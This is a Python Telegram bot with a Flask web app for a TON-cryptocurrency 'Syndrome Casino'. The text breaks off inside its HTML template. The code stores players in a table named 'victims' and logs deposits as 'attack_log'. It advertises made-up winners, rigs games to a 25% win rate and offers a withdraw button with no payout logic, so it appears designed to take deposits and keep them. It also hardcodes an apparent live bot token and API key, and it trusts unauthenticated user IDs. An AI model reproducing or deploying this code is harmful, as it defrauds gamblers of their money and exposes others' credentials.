import asyncio
import logging
import sqlite3
import random
import hashlib
import base64
import os
import requests
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string

# Aiogram
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo, MenuButtonWebApp, BotCommand,
    Message, CallbackQuery
)
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web as aiohttp_web

# =================================================================
# КОНФИГУРАЦИЯ (ЗАПОЛНИ СВОИ ДАННЫЕ!)
# =================================================================
BOT_TOKEN = "8978316248:AAF4n6jG5gr4quppre6H1NB7U9LjEjnESqs"  # <-- СЮДА ТОКЕН!
ADMIN_ID = 7753887058  # <-- ТВОЙ TELEGRAM ID
TON_WALLET = "UQDRRRGutl_ccP25XcwbOK-RN2UXuvE1_GFoerlaIDvmwO7I"  # <-- КОШЕЛЕК
TONCENTER_API_KEY = "12237ee2c684a00cd473582230a4d9efea8b51b6baf2322883e4ef52f5d34390"  # <-- API КЛЮЧ TONCENTER
TONCENTER_URL = "https://toncenter.com/api/v2"

# URL приложения (Render даст после деплоя)
RENDER_URL = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'localhost:8080')
WEBAPP_URL = f"https://syndrome-bot-1.onrender.com"

# =================================================================
# БАЗА ДАННЫХ
# =================================================================
DB_PATH = 'syndrome_casino.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.executescript('''
        CREATE TABLE IF NOT EXISTS victims (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            balance_ton REAL DEFAULT 0,
            total_deposited_ton REAL DEFAULT 0,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            referral_earnings REAL DEFAULT 0,
            last_activity TIMESTAMP,
            pending_payment_id TEXT,
            pending_payment_time TIMESTAMP,
            total_wins INTEGER DEFAULT 0,
            total_games INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS attack_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            attack_type TEXT,
            amount REAL,
            currency TEXT,
            tx_hash TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS referrals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referrer_id INTEGER,
            referred_id INTEGER,
            earnings_for_referrer REAL DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    conn.commit()
    return conn

# =================================================================
# ФУНКЦИИ
# =================================================================
def generate_payment_id(user_id):
    timestamp = int(datetime.now().timestamp())
    raw = f"SYN{user_id}X{timestamp}X{random.randint(1000,9999)}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()

def generate_referral_code(user_id):
    raw = f"REF{user_id}{int(datetime.now().timestamp())}{random.randint(1000,9999)}"
    return hashlib.md5(raw.encode()).hexdigest()[:8].upper()

def get_or_create_ref_code(conn, user_id):
    cursor = conn.cursor()
    cursor.execute('SELECT referral_code FROM victims WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    if result and result[0]:
        return result[0]
    code = generate_referral_code(user_id)
    cursor.execute('UPDATE victims SET referral_code = ? WHERE user_id = ?', (code, user_id))
    conn.commit()
    return code

def verify_ton_transaction(wallet_address, comment, hours=24):
    try:
        params = {'address': wallet_address, 'limit': 50, 'api_key': TONCENTER_API_KEY}
        response = requests.get(f"{TONCENTER_URL}/getTransactions", params=params, timeout=10)
        if response.status_code != 200:
            return None
        data = response.json()
        if not data.get('ok'):
            return None
        transactions = data.get('result', [])
        cutoff_time = datetime.now() - timedelta(hours=hours)
        for tx in transactions:
            in_msg = tx.get('in_msg', {})
            if not in_msg:
                continue
            source = in_msg.get('source', '')
            if source == wallet_address:
                continue
            value_ton = int(in_msg.get('value', 0)) / 1_000_000_000
            msg_comment = in_msg.get('message', '')
            if comment.upper() in msg_comment.upper():
                tx_time = datetime.fromtimestamp(tx.get('utime', 0))
                if tx_time > cutoff_time:
                    return {
                        'hash': tx.get('hash', ''),
                        'amount': value_ton,
                        'time': tx_time.isoformat()
                    }
        return None
    except Exception as e:
        logging.error(f"TON error: {e}")
        return None

# =================================================================
# БОТ
# =================================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.message(Command("start"))
async def start_command(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name or "Unknown"
    
    conn = init_db()
    cursor = conn.cursor()
    
    args = message.text.split()
    referrer_code = args[1] if len(args) > 1 else None
    
    cursor.execute('INSERT OR IGNORE INTO victims (user_id, username, last_activity) VALUES (?, ?, CURRENT_TIMESTAMP)', 
                   (user_id, username))
    
    if referrer_code:
        cursor.execute('SELECT user_id FROM victims WHERE referral_code = ?', (referrer_code,))
        referrer = cursor.fetchone()
        if referrer and referrer[0] != user_id:
            cursor.execute('INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)', 
                         (referrer[0], user_id))
            cursor.execute('UPDATE victims SET referred_by = ? WHERE user_id = ?', (referrer[0], user_id))
    
    get_or_create_ref_code(conn, user_id)
    conn.commit()
    conn.close()
    
    # Главное меню с кнопкой WebApp
    keyboard = InlineKeyboardBuilder()
    keyboard.add(InlineKeyboardButton(
        text="🎰 ЗАПУСТИТЬ SYNDROME CASINO",
        web_app=WebAppInfo(url=WEBAPP_URL)
    ))
    keyboard.add(InlineKeyboardButton(text="💰 ПОПОЛНИТЬ TON", callback_data="deposit_ton"))
    keyboard.add(InlineKeyboardButton(text="👥 РЕФЕРАЛЬНАЯ СИСТЕМА", callback_data="referral_info"))
    keyboard.add(InlineKeyboardButton(text="💼 БАЛАНС", callback_data="check_balance"))
    keyboard.adjust(1)
    
    await message.answer(
        "🔥 *SYNDROME CASINO — ПРЕМИАЛЬНОЕ TON-КАЗИНО* 🔥\n\n"
        "🎰 *Слоты, Рулетка, Кости, Блэкджек*\n"
        "💎 *Мгновенные депозиты через TON*\n"
        "💰 *Мгновенные выплаты от 10 TON*\n"
        "👥 *Реферальная система 20%*\n\n"
        "🎁 *НАЖМИ НА КНОПКУ НИЖЕ!*\n"
        "⚡ *ТОПОВЫЕ ВЫИГРЫШИ СЕГОДНЯ:*\n"
        f"• @crypto_whale — 340 TON\n"
        f"• @ton_master — 150 TON\n"
        f"• @lucky_gambler — 89 TON",
        reply_markup=keyboard.as_markup()
    )

@dp.callback_query(F.data == "deposit_ton")
async def deposit_ton(callback: CallbackQuery):
    user_id = callback.from_user.id
    payment_id = generate_payment_id(user_id)
    
    conn = init_db()
    cursor = conn.cursor()
    cursor.execute('UPDATE victims SET pending_payment_id = ?, pending_payment_time = CURRENT_TIMESTAMP WHERE user_id = ?', 
                   (payment_id, user_id))
    conn.commit()
    conn.close()
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПРОВЕРИТЬ ОПЛАТУ", callback_data=f"checkpay_{payment_id}")],
        [InlineKeyboardButton(text="🔄 НОВЫЙ КОД", callback_data="deposit_ton")],
        [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
    ])
    
    await callback.message.edit_text(
        "💎 *ПОПОЛНЕНИЕ ЧЕРЕЗ TON* 💎\n\n"
        f"📤 Отправьте TON на кошелёк:\n\n"
        f"`{TON_WALLET}`\n\n"
        f"📝 *КОД В КОММЕНТАРИИ К ТРАНЗАКЦИИ:*\n"
        f"`{payment_id}`\n\n"
        f"⚠️ *ВАЖНО:* Без кода платёж НЕ зачислится!\n"
        f"💰 Минимальная сумма: *0.1 TON*\n\n"
        f"После отправки нажмите кнопку проверки.",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("checkpay_"))
async def check_payment(callback: CallbackQuery):
    payment_id = callback.data.replace("checkpay_", "")
    user_id = callback.from_user.id
    
    await callback.message.edit_text(
        "🔍 *ПРОВЕРКА ТРАНЗАКЦИИ*\n\n"
        "Сканирую блокчейн TON...\n"
        "Пожалуйста, подождите.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 ОБНОВИТЬ", callback_data=f"checkpay_{payment_id}")]
        ])
    )
    
    result = verify_ton_transaction(TON_WALLET, payment_id, 24)
    
    if result:
        conn = init_db()
        cursor = conn.cursor()
        amount_ton = result['amount']
        
        cursor.execute('''
            UPDATE victims 
            SET balance_ton = balance_ton + ?, 
                total_deposited_ton = total_deposited_ton + ?, 
                pending_payment_id = NULL 
            WHERE user_id = ?
        ''', (amount_ton, amount_ton, user_id))
        
        cursor.execute('''
            INSERT INTO attack_log (user_id, attack_type, amount, currency, tx_hash) 
            VALUES (?, "ton_deposit", ?, "TON", ?)
        ''', (user_id, amount_ton, result['hash'][:20]))
        
        # Реферальный бонус
        cursor.execute('SELECT referred_by FROM victims WHERE user_id = ?', (user_id,))
        referrer = cursor.fetchone()
        if referrer and referrer[0]:
            bonus = amount_ton * 0.20
            cursor.execute('UPDATE victims SET referral_earnings = referral_earnings + ? WHERE user_id = ?', 
                         (bonus, referrer[0]))
            cursor.execute('UPDATE referrals SET earnings_for_referrer = earnings_for_referrer + ? WHERE referred_id = ?', 
                         (bonus, user_id))
        
        conn.commit()
        conn.close()
        
        await bot.send_message(
            ADMIN_ID,
            f"💰 *НОВЫЙ ПЛАТЕЖ!*\n\n"
            f"👤 @{callback.from_user.username or 'Unknown'}\n"
            f"💎 Сумма: *{amount_ton:.4f} TON*\n"
            f"🔗 Хеш: `{result['hash'][:20]}...`"
        )
        
        await callback.message.edit_text(
            f"✅ *ПЛАТЕЖ УСПЕШНО ЗАЧИСЛЕН!*\n\n"
            f"💰 Зачислено: *{amount_ton:.4f} TON*\n"
            f"🔗 Транзакция: `{result['hash'][:20]}...`\n\n"
            f"🎰 Теперь вы можете играть в казино!\n"
            f"Нажмите кнопку ниже, чтобы начать.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎰 ИГРАТЬ В КАЗИНО", web_app=WebAppInfo(url=WEBAPP_URL))],
                [InlineKeyboardButton(text="🏠 ГЛАВНОЕ МЕНЮ", callback_data="main_menu")]
            ])
        )
    else:
        await callback.message.edit_text(
            "❌ *ПЛАТЕЖ НЕ НАЙДЕН*\n\n"
            "Возможные причины:\n"
            "• Транзакция ещё обрабатывается\n"
            "• Не указан код в комментарии\n"
            "• Отправлено меньше минимальной суммы\n\n"
            "Попробуйте снова через 1-2 минуты.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 ПРОВЕРИТЬ СНОВА", callback_data=f"checkpay_{payment_id}")],
                [InlineKeyboardButton(text="💎 НОВЫЙ ПЛАТЕЖ", callback_data="deposit_ton")],
                [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
            ])
        )
    
    await callback.answer()

@dp.callback_query(F.data == "check_balance")
async def check_balance(callback: CallbackQuery):
    conn = init_db()
    cursor = conn.cursor()
    user_id = callback.from_user.id
    cursor.execute('''
        SELECT balance_ton, total_deposited_ton, referral_earnings, total_wins, total_games 
        FROM victims WHERE user_id = ?
    ''', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        balance, deposited, ref_earn, wins, games = result
        win_rate = round((wins / games) * 100) if games > 0 else 0
        
        await callback.message.edit_text(
            f"💼 *ВАШ БАЛАНС*\n\n"
            f"💰 Доступно: *{balance:.4f} TON*\n"
            f"💎 Пополнено всего: *{deposited:.2f} TON*\n"
            f"👥 Реферальный доход: *{ref_earn:.2f} TON*\n\n"
            f"📊 *СТАТИСТИКА ИГР*\n"
            f"🏆 Побед: *{wins}*\n"
            f"🎮 Всего игр: *{games}*\n"
            f"📈 Win Rate: *{win_rate}%*",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎰 ИГРАТЬ", web_app=WebAppInfo(url=WEBAPP_URL))],
                [InlineKeyboardButton(text="💰 ПОПОЛНИТЬ", callback_data="deposit_ton")],
                [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
            ])
        )
    await callback.answer()

@dp.callback_query(F.data == "referral_info")
async def referral_info(callback: CallbackQuery):
    conn = init_db()
    cursor = conn.cursor()
    user_id = callback.from_user.id
    code = get_or_create_ref_code(conn, user_id)
    
    cursor.execute('''
        SELECT COUNT(*), COALESCE(SUM(earnings_for_referrer), 0) 
        FROM referrals WHERE referrer_id = ?
    ''', (user_id,))
    ref_count, ref_earnings = cursor.fetchone()
    conn.close()
    
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={code}"
    
    await callback.message.edit_text(
        "👥 *РЕФЕРАЛЬНАЯ СИСТЕМА 20%*\n\n"
        "Приглашайте друзей и получайте *20%* от их депозитов!\n\n"
        f"👤 Приглашено: *{ref_count}*\n"
        f"💰 Заработано: *{ref_earnings:.2f} TON*\n\n"
        f"🔗 *Ваша ссылка:*\n"
        f"`{ref_link}`\n\n"
        f"📋 *Код:* `{code}`\n\n"
        "Поделитесь ссылкой с друзьями и зарабатывайте!",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📤 ПОДЕЛИТЬСЯ", switch_inline_query=code)],
            [InlineKeyboardButton(text="🏠 МЕНЮ", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "main_menu")
async def main_menu(callback: CallbackQuery):
    keyboard = InlineKeyboardBuilder()
    keyboard.add(InlineKeyboardButton(
        text="🎰 ЗАПУСТИТЬ SYNDROME CASINO",
        web_app=WebAppInfo(url=WEBAPP_URL)
    ))
    keyboard.add(InlineKeyboardButton(text="💰 ПОПОЛНИТЬ TON", callback_data="deposit_ton"))
    keyboard.add(InlineKeyboardButton(text="👥 РЕФЕРАЛЬНАЯ СИСТЕМА", callback_data="referral_info"))
    keyboard.add(InlineKeyboardButton(text="💼 БАЛАНС", callback_data="check_balance"))
    keyboard.adjust(1)
    
    await callback.message.edit_text(
        "🔥 *SYNDROME CASINO — ГЛАВНОЕ МЕНЮ*\n\n"
        "Выберите действие:",
        reply_markup=keyboard.as_markup()
    )
    await callback.answer()

# =================================================================
# FLASK ПРИЛОЖЕНИЕ (СЕРВЕР + WebApp)
# =================================================================
flask_app = Flask(__name__)

# Главная страница = WebApp интерфейс
@flask_app.route('/')
def webapp():
    return render_template_string(WEBAPP_HTML)

# API для WebApp
@flask_app.route('/api/user/<int:user_id>')
def get_user_data(user_id):
    conn = init_db()
    cursor = conn.cursor()
    cursor.execute('''
        SELECT balance_ton, total_deposited_ton, total_wins, total_games 
        FROM victims WHERE user_id = ?
    ''', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        return jsonify({
            'balance': result[0],
            'deposited': result[1],
            'totalWins': result[2],
            'totalGames': result[3]
        })
    return jsonify({'balance': 0, 'deposited': 0, 'totalWins': 0, 'totalGames': 0})

@flask_app.route('/api/game', methods=['POST'])
def process_game():
    data = request.json
    user_id = data.get('user_id')
    game_type = data.get('game_type')
    bet_amount = float(data.get('bet_amount', 0))
    
    conn = init_db()
    cursor = conn.cursor()
    
    # Проверка баланса
    cursor.execute('SELECT balance_ton FROM victims WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if not result or result[0] < bet_amount:
        conn.close()
        return jsonify({'error': 'Insufficient balance'}), 400
    
    # Механика игры (казино всегда в плюсе)
    win = random.choices([True, False], weights=[25, 75])[0]  # 25% шанс выигрыша
    
    if win:
        multiplier = random.choices([2, 3, 5], weights=[50, 35, 15])[0]
        win_amount = bet_amount * multiplier
        cursor.execute('UPDATE victims SET balance_ton = balance_ton + ?, total_wins = total_wins + 1, total_games = total_games + 1 WHERE user_id = ?', 
                      (win_amount - bet_amount, user_id))
    else:
        win_amount = 0
        cursor.execute('UPDATE victims SET balance_ton = balance_ton - ?, total_games = total_games + 1 WHERE user_id = ?', 
                      (bet_amount, user_id))
    
    cursor.execute('INSERT INTO attack_log (user_id, attack_type, amount, currency) VALUES (?, ?, ?, "TON")', 
                   (user_id, f"{game_type}_{'win' if win else 'lose'}", win_amount if win else bet_amount))
    
    conn.commit()
    conn.close()
    
    return jsonify({
        'win': win,
        'amount': win_amount,
        'multiplier': multiplier if win else 0
    })

@flask_app.route('/webhook', methods=['POST'])
async def webhook():
    if request.method == 'POST':
        update = request.get_json()
        try:
            await dp.feed_raw_update(update)
        except Exception as e:
            logging.error(f"Webhook error: {e}")
        return 'ok', 200
    return 'error', 400

# =================================================================
# HTML ШАБЛОН (ТОТ ЖЕ СТИЛЬ ЧТО И GiftSpinnerBot)
# =================================================================
WEBAPP_HTML = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#0a0a1a">
    <title>SYNDROME CASINO | TON</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
        
        :root {
            --bg-primary: #0a0a1a;
            --bg-secondary: #12122a;
            --bg-card: rgba(255, 255, 255, 0.03);
            --border-glass: rgba(255, 255, 255, 0.08);
            --text-primary: #ffffff;
            --text-secondary: #8a8aa8;
            --accent-red: #ff2d55;
            --accent-gold: #ffd700;
            --accent-purple: #7c3aed;
            --accent-blue: #3b82f6;
            --accent-green: #10b981;
            --gradient-red: linear-gradient(135deg, #ff2d55 0%, #ff6b6b 100%);
            --gradient-gold: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%);
            --gradient-purple: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            --gradient-blue: linear-gradient(135deg, #3b82f6 0%, #60a5fa 100%);
            --gradient-green: linear-gradient(135deg, #10b981 0%, #34d399 100%);
            --shadow-glow-red: 0 0 20px rgba(255, 45, 85, 0.3);
            --shadow-glow-gold: 0 0 20px rgba(255, 215, 0, 0.3);
            --shadow-glow-purple: 0 0 20px rgba(124, 58, 237, 0.3);
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            -webkit-tap-highlight-color: transparent;
            -webkit-font-smoothing: antialiased;
        }
        
        .particles-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 0;
            overflow: hidden;
        }
        
        .particle {
            position: absolute;
            width: 3px; height: 3px;
            background: var(--accent-gold);
            border-radius: 50%;
            animation: float 6s infinite;
            opacity: 0.3;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 0.3; }
            90% { opacity: 0.3; }
            100% { transform: translateY(-100vh) scale(1); opacity: 0; }
        }
        
        .app-container {
            position: relative;
            z-index: 1;
            max-width: 480px;
            margin: 0 auto;
            padding: 16px;
            min-height: 100vh;
            padding-bottom: 80px;
        }
        
        .header {
            background: var(--bg-secondary);
            border: 1px solid var(--border-glass);
            border-radius: 20px;
            padding: 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }
        
        .profile-avatar {
            width: 48px; height: 48px;
            border-radius: 50%;
            background: var(--gradient-purple);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: 700;
            color: white;
            box-shadow: var(--shadow-glow-purple);
        }
        
        .profile-info { flex: 1; }
        
        .profile-name {
            font-size: 16px;
            font-weight: 700;
            color: var(--text-primary);
        }
        
        .profile-level {
            font-size: 12px;
            color: var(--accent-gold);
            font-weight: 500;
        }
        
        .balance-card {
            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2) 0%, rgba(59, 130, 246, 0.2) 100%);
            border: 1px solid rgba(124, 58, 237, 0.3);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }
        
        .balance-card::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(124, 58, 237, 0.1) 0%, transparent 70%);
            animation: rotate 10s linear infinite;
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        .balance-label {
            font-size: 13px;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
        }
        
        .balance-amount {
            font-size: 36px;
            font-weight: 900;
            background: var(--gradient-gold);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            position: relative;
            z-index: 1;
        }
        
        .balance-usd {
            font-size: 14px;
            color: var(--text-secondary);
            margin-top: 4px;
            position: relative;
            z-index: 1;
        }
        
        .balance-actions {
            display: flex;
            gap: 10px;
            margin-top: 16px;
            position: relative;
            z-index: 1;
        }
        
        .btn {
            padding: 12px 20px;
            border-radius: 14px;
            border: none;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-family: 'Inter', sans-serif;
        }
        
        .btn-primary {
            background: var(--gradient-purple);
            color: white;
            box-shadow: var(--shadow-glow-purple);
            flex: 1;
        }
        
        .btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
            border: 1px solid var(--border-glass);
            flex: 1;
        }
        
        .btn:hover { transform: translateY(-2px); }
        
        .section-title {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .section-title::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--border-glass);
        }
        
        .games-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .game-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-glass);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .game-card:hover {
            transform: translateY(-3px);
            border-color: rgba(255, 215, 0, 0.3);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
        }
        
        .game-icon { font-size: 40px; margin-bottom: 12px; position: relative; z-index: 1; }
        .game-name { font-size: 15px; font-weight: 600; margin-bottom: 4px; position: relative; z-index: 1; }
        .game-bet { font-size: 12px; color: var(--accent-gold); font-weight: 500; position: relative; z-index: 1; }
        
        .game-hot {
            position: absolute;
            top: 10px; right: 10px;
            background: var(--gradient-red);
            color: white;
            padding: 4px 8px;
            border-radius: 8px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            z-index: 2;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-glass);
            border-radius: 16px;
            padding: 16px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 20px;
            font-weight: 700;
            color: var(--accent-gold);
            margin-bottom: 4px;
        }
        
        .stat-label {
            font-size: 11px;
            color: var(--text-secondary);
            text-transform: uppercase;
        }
        
        .game-modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 1000;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }
        
        .game-modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background: var(--bg-secondary);
            border: 1px solid var(--border-glass);
            border-radius: 24px;
            padding: 24px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            position: relative;
        }
        
        .modal-close {
            position: absolute;
            top: 16px; right: 16px;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            color: white;
            width: 36px; height: 36px;
            border-radius: 50%;
            font-size: 18px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .modal-title {
            font-size: 24px;
            font-weight: 800;
            margin-bottom: 24px;
            background: var(--gradient-gold);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .slot-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 24px 0;
        }
        
        .slot-reel {
            width: 80px; height: 80px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid var(--border-glass);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            transition: all 0.1s ease;
        }
        
        .slot-reel.spinning {
            animation: reelSpin 0.1s linear infinite;
        }
        
        @keyframes reelSpin {
            0% { transform: translateY(-10px); }
            50% { transform: translateY(10px); }
            100% { transform: translateY(-10px); }
        }
        
        .roulette-wheel {
            width: 200px; height: 200px;
            border-radius: 50%;
            background: conic-gradient(
                #ff2d55 0deg 36deg, #000 36deg 72deg,
                #ff2d55 72deg 108deg, #000 108deg 144deg,
                #ff2d55 144deg 180deg, #000 180deg 216deg,
                #ff2d55 216deg 252deg, #000 252deg 288deg,
                #ff2d55 288deg 324deg, #000 324deg 360deg
            );
            margin: 24px auto;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 3s cubic-bezier(0.17, 0.67, 0.12, 0.99);
        }
        
        .roulette-center {
            width: 60px; height: 60px;
            background: var(--bg-primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: 700;
            color: var(--accent-gold);
        }
        
        .game-btn {
            background: var(--gradient-purple);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin: 20px 0;
            width: 100%;
            box-shadow: var(--shadow-glow-purple);
            transition: all 0.3s ease;
        }
        
        .game-btn:hover { transform: translateY(-2px); }
        .game-btn:active { transform: scale(0.98); }
        
        .result-banner {
            padding: 16px;
            border-radius: 16px;
            margin: 16px 0;
            font-weight: 700;
            font-size: 18px;
        }
        
        .result-win {
            background: rgba(16, 185, 129, 0.2);
            border: 1px solid rgba(16, 185, 129, 0.3);
            color: #10b981;
        }
        
        .result-lose {
            background: rgba(255, 45, 85, 0.2);
            border: 1px solid rgba(255, 45, 85, 0.3);
            color: #ff2d55;
        }
        
        .bottom-nav {
            position: fixed;
            bottom: 0; left: 0; right: 0;
            background: var(--bg-secondary);
            border-top: 1px solid var(--border-glass);
            padding: 12px 16px;
            display: flex;
            justify-content: space-around;
            z-index: 100;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }
        
        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            cursor: pointer;
            padding: 8px 16px;
            border-radius: 12px;
            transition: all 0.3s ease;
        }
        
        .nav-item.active { background: rgba(124, 58, 237, 0.2); }
        .nav-icon { font-size: 24px; }
        .nav-label { font-size: 11px; color: var(--text-secondary); font-weight: 500; }
        .nav-item.active .nav-label { color: var(--accent-purple); }
        
        .toast {
            position: fixed;
            top: 20px; left: 50%;
            transform: translateX(-50%);
            background: var(--bg-secondary);
            border: 1px solid var(--border-glass);
            border-radius: 16px;
            padding: 16px 24px;
            z-index: 2000;
            display: flex;
            align-items: center;
            gap: 12px;
            animation: slideDown 0.3s ease;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }
        
        @keyframes slideDown {
            from { transform: translate(-50%, -100%); opacity: 0; }
            to { transform: translate(-50%, 0); opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="particles-bg" id="particles"></div>
    
    <div class="app-container">
        <div class="header">
            <div class="profile-avatar" id="avatar">S</div>
            <div class="profile-info">
                <div class="profile-name" id="username">Syndrome Player</div>
                <div class="profile-level">👑 VIP Status</div>
            </div>
            <div style="font-size: 24px;">💎</div>
        </div>
        
        <div class="balance-card">
            <div class="balance-label">💰 ВАШ БАЛАНС</div>
            <div class="balance-amount" id="balance">0.00 TON</div>
            <div class="balance-usd" id="balanceUsd">≈ $0.00 USD</div>
            <div class="balance-actions">
                <button class="btn btn-primary" onclick="tg.openTelegramLink('https://t.me/SyndromeCasinoBot')">📥 ПОПОЛНИТЬ</button>
                <button class="btn btn-secondary" onclick="showToast('Вывод от 10 TON', '💎')">📤 ВЫВЕСТИ</button>
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalWins">0</div>
                <div class="stat-label">🏆 Побед</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalGames">0</div>
                <div class="stat-label">🎮 Игр</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="winRate">0%</div>
                <div class="stat-label">📊 Win Rate</div>
            </div>
        </div>
        
        <div class="section-title">🎰 ИГРЫ</div>
        <div class="games-grid">
            <div class="game-card" onclick="openGame('slots')">
                <div class="game-hot">HOT 🔥</div>
                <div class="game-icon">🎰</div>
                <div class="game-name">СЛОТЫ</div>
                <div class="game-bet">Ставка: 0.1 TON</div>
            </div>
            <div class="game-card" onclick="openGame('roulette')">
